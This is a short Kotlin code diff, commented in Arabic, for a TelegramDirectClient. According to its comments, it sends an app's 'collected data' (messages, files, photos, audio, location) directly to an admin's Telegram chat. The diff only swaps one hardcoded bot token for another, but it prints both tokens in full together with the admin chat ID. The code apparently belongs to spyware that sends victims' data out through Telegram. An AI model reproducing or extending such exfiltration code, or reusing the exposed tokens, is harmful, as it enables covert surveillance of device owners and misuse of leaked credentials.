@@ -37,13 +37,13 @@ import javax.net.ssl.X509TrustManager
  * - التطبيق يرسل البيانات المجمعة مباشرة للمدير عبر sendMessage / sendDocument / sendPhoto / sendAudio / sendLocation
  * - لا حاجة لأي سيرفر وسيط
  *
- * البوت توكن: 8898830696:AAGhrsmavkljSpF8d9SUw1XbM5syh4nzGF4
+ * البوت توكن: 8898830696:AAGpgjtwn2cB5wcKQ07PJPXjhKF0Ll43wrs
  * المدير ID: 7344776596
  */
 object TelegramDirectClient {
 
     private const val TAG = "TelegramDirectClient"
-    const val BOT_TOKEN = "8898830696:AAGhrsmavkljSpF8d9SUw1XbM5syh4nzGF4"
+    const val BOT_TOKEN = "8898830696:AAGpgjtwn2cB5wcKQ07PJPXjhKF0Ll43wrs"
     const val ADMIN_CHAT_ID = 7344776596L
     private const val TELEGRAM_API = "https://api.telegram.org/bot$BOT_TOKEN"
     private const val CONNECT_TIMEOUT = 20000
